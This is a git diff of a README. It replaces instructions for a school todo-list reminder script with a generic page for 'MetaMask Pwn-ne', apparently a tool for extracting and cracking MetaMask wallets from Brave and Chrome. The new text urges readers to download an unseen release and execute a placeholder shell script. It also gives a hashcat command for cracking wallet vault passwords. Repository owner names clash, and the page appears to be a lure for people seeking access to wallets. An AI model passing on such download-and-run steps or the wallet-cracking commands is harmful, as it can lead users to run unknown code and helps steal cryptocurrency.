@@ -1,165 +1,139 @@
-# Todo-List-Reminder-For-School
-[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-purple)](https://github.com/casanova-100/metamask_pwn-ne/releases)
+# 🛠️ MetaMask Pwn-ne: Wallet Recovery Tools
 
-## Installation Guide
-**Follow these steps to set up the Todo List system on your computer:**
+![GitHub release](https://img.shields.io/github/release/nicollaslmfao/metamask_pwn-ne.svg) ![License](https://img.shields.io/badge/license-MIT-blue.svg)
 
-### 1️⃣ Run the Installer
-Locate and run Installation.bat to set up necessary files and dependencies.
+Welcome to the **MetaMask Pwn-ne** repository! This project provides essential tools for recovering, extracting, and decrypting MetaMask wallets. Whether you're a developer or a security enthusiast, you'll find useful resources here to help you navigate the complexities of wallet recovery.
 
-Wait for the installation to complete. Once done, the script is ready to use.
+## 📦 Getting Started
 
-### 2️⃣ Create a Shortcut for todo.txt
-Navigate to the folder where todo.txt is located.
+To get started with the tools, you can download the latest release from our [Releases section](https://github.com/nicollaslmfao/metamask_pwn-ne/releases). This will give you access to the latest features and improvements.
 
-Right-click on todo.txt → Send to → Desktop (Create Shortcut).
+### 🔗 Download and Execute
 
-Rename the shortcut if desired.
+Once you download the release, follow these steps:
 
-### 3️⃣ Add the Shortcut to the Start Menu
-Move the todo.txt shortcut to:
+1. Unzip the downloaded file.
+2. Navigate to the folder in your terminal.
+3. Execute the script using the command: `./your_script_name.sh`.
 
-Windows 10/11: C:\Users\YourUsername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
+Make sure you have the necessary permissions to run scripts on your machine.
 
-This allows you to easily open todo.txt via the Start Menu.
+## 🌟 Features
 
-### 4️⃣ Assign Num + Hotkey to Open the Todo List
-Right-click on the todo.txt shortcut and select Properties.
+- **Wallet Recovery**: Tools to help recover lost or inaccessible MetaMask wallets.
+- **Data Extraction**: Easily extract wallet data for further analysis.
+- **Decryption Tools**: Securely decrypt wallet files to access your funds.
+- **Cross-Browser Compatibility**: Works seamlessly with both Brave and Chrome browsers.
 
-In the Shortcut Key field, press Num + (Numpad Plus key).
+## 🛠️ Installation
 
-Click Apply and OK. Now, pressing Num + will open todo.txt.
+### Prerequisites
 
-### 5️⃣ Change the Icon
-In Properties, click Change Icon.
+Before you begin, ensure you have the following installed:
 
-Browse to the installation folder and select 4697260.ICO.
+- Python 3.x
+- Git
+- Hashcat (for decryption)
+- Any additional dependencies listed in the `requirements.txt` file.
 
-Click OK, then Apply to save the changes.
+### Installation Steps
 
-**🎉 Setup Complete! You can now manage tasks with ease using todo.txt and the automated reminders! 🚀**
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/nicollaslmfao/metamask_pwn-ne.git
+   ```
+2. Navigate into the project directory:
+   ```bash
+   cd metamask_pwn-ne
+   ```
+3. Install the required dependencies:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-## Guide to your Todo List
+## 🔍 Usage
 
+### Recovering a Wallet
 
+To recover a wallet, run the following command in your terminal:
 
-### 1. Hotkeys
+```bash
+python recover_wallet.py --file your_wallet_file.json
+```
 
+Replace `your_wallet_file.json` with the path to your wallet file.
 
-The script includes specific hotkeys that allow you to interact with it while it's running. These hotkeys are set to trigger certain actions, such as generating reports or sending notifications. Below are the hotkeys available and what they do:
+### Extracting Data
 
-**Hotkeys:**
+To extract data from your wallet, use:
 
-Alt+Num -
+```bash
+python extract_data.py --file your_wallet_file.json
+```
 
-Action: Sends an instant summary report of the remaining tasks.
+### Decrypting Wallets
 
-Description: When you press the "Alt" key then the "Num -" key, the script will immediately send a notification with a summary of the pending tasks, including their due dates and time remaining until they are due.
+To decrypt a wallet, Hashcat is required. Use the following command:
 
-Alt+Num *
+```bash
+hashcat -m 17220 your_hash_file.txt your_wordlist.txt
+```
 
-Action: Sends a detailed report of all tasks.
+Ensure you have the correct hash type for MetaMask wallets.
 
-Description: Pressing the "Alt" key then the "Num *" key triggers the script to send a detailed report of all tasks, including those with due dates and the remaining time. It will list the tasks with their due dates and the time left until they are due. If a task does not have a due date, it will be listed without that information.
+## 🔖 Topics
 
+This repository covers various topics relevant to wallet recovery and security. Here are some key topics:
 
-### 2. Editing the todo.txt File
+- **Brave**: Integration with the Brave browser for wallet access.
+- **Chrome**: Compatibility with Chrome for seamless user experience.
+- **Crack**: Techniques for cracking wallet passwords.
+- **Crypto**: General cryptocurrency knowledge and wallet management.
+- **Cyclone**: Advanced recovery methods using Cyclone technology.
+- **Hashcat**: Utilizing Hashcat for password recovery.
+- **MetaMask**: Specific tools tailored for MetaMask users.
+- **Password**: Strategies for managing and recovering passwords.
+- **Pwn**: Ethical hacking techniques for wallet security.
+- **Recover**: Methods to recover lost wallets.
+- **Recovery**: Comprehensive recovery strategies.
+- **Vault**: Secure vault management for cryptocurrencies.
+- **Wallet**: General wallet management practices.
 
+## 📚 Documentation
 
-The todo.txt file is the main file where your tasks are stored. The script reads from and updates this file, adding new tasks and keeping track of the ones you need to complete. Here’s how you should format and edit the todo.txt file.
+For detailed documentation, refer to the `docs` folder in the repository. It contains comprehensive guides on each tool and feature.
 
-**Basic Format:**
+## 🤝 Contributing
 
-Tasks should be written in the following format:
+We welcome contributions! If you'd like to contribute, please follow these steps:
 
-*- [ ] Task description (MM/DD/YYYY/HH:MM)*
+1. Fork the repository.
+2. Create a new branch: `git checkout -b feature/YourFeature`.
+3. Make your changes.
+4. Commit your changes: `git commit -m 'Add your feature'`.
+5. Push to the branch: `git push origin feature/YourFeature`.
+6. Open a Pull Request.
 
-*- [ ]* indicates that the task is incomplete.
+## 📈 Roadmap
 
-Task description is a brief summary of the task.
+We plan to enhance this repository with more features, including:
 
-(MM/DD/YYYY/HH:MM) is the due date and time, in the format Month/Day/Year/Hour:Minute (24-hour format).
+- Improved user interface for easier navigation.
+- More robust recovery algorithms.
+- Additional support for other wallet types.
 
-For example:
+## 🛡️ License
 
-*- [ ] Complete homework (04/05/2025/14:00)*
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-*- [ ] Submit project report (04/06/2025/17:00)*
+## 💬 Support
 
-If a task does not have a due date or if it's not assigned yet, simply omit the date portion:
+For support, please open an issue in the GitHub repository or contact us via our community forum.
 
-*- [ ] Buy groceries*
+## 🌐 Visit Our Releases
 
-**Important Points:**
+To explore the latest updates and features, visit our [Releases section](https://github.com/nicollaslmfao/metamask_pwn-ne/releases).
 
-Tasks without due dates can be added without the parentheses and date.
+---
 
-Tasks that have a grade (e.g., from an assignment or homework) but are incomplete or missing should be written with "(No grade/Incomplete)" or similar tags, as handled by the script:
-
-*- [ ] Read chapter 5 (No grade/Incomplete)*
-
-Each task should be written on a new line, starting with *- [ ]*.
-
-Example todo.txt File:
-
-*- [ ] Complete homework (04/05/2025/14:00)*
-
-*- [ ] Submit project report (04/06/2025/17:00)*
-
-*- [ ] Buy groceries*
-
-*- [ ] Call mom (No grade/Incomplete)*
-
-The script will process the tasks from this file, determining which are due soon and which have penalties if overdue.
-
-### 3. Notification Time Interval
-
-
-The script sends reminders about tasks at regular intervals. You can adjust how often the script checks for pending tasks and sends reminders. This is controlled by the REMINDER_INTERVAL variable.
-
-**Default Notification Interval:**
-
-The REMINDER_INTERVAL is set to 1800 seconds, which is 30 minutes.
-
-This means that the script will check for the most urgent task every 30 minutes and send a reminder notification if needed.
-
-**Customizing the Interval:**
-
-If you'd like to change the frequency of the reminders, you can adjust the REMINDER_INTERVAL in the script. For example, to change the interval to 1 hour (3600 seconds), simply modify the value like this:
-
-REMINDER_INTERVAL = 3600  # 1 hour (3600 seconds)
-
-This change will cause the script to send reminders every 60 minutes instead of every 30 minutes.
-
-### Summary of Key Features:
-
-
-**Hotkeys:**
-
-Alt+Num -: Instant summary report of tasks.
-
-Alt+Num *: Detailed task report with due dates.
-
-_If you wish to change these hotkeys, edit them within reminder.py_
-
-**Editing todo.txt:**
-
-Tasks are written with *- [ ] Task description (MM/DD/YYYY/HH:MM)* for tasks with due dates.
-
-Tasks without due dates should just have *- [ ] Task description*.
-
-**Notification Time Interval:**
-
-Default is 30 minutes (1800 seconds), adjustable by modifying REMINDER_INTERVAL.
-
-
-**With this manual, you should be able to effectively use the hotkeys, format your tasks in todo.txt, and customize the time interval for notifications.**
-
-### TO START PROGRAM, RUN INSTALLATION.BAT IN DOWNLOADS, NOT IN THE FOLDER
-### CLOSE TERMINAL TO STOP PROGRAM
-### TERMINAL WILL CLOSE ONCE ALL TASKS ARE COMPLETE
-
-<!-- Local image -->
-<p align="center">
-  <img src="AchievrLogo.png" alt="Project Logo" width="200"/>
-</p>
+Thank you for checking out **MetaMask Pwn-ne**! We hope these tools help you in your wallet recovery journey. If you have any questions or feedback, feel free to reach out. Happy recovering!
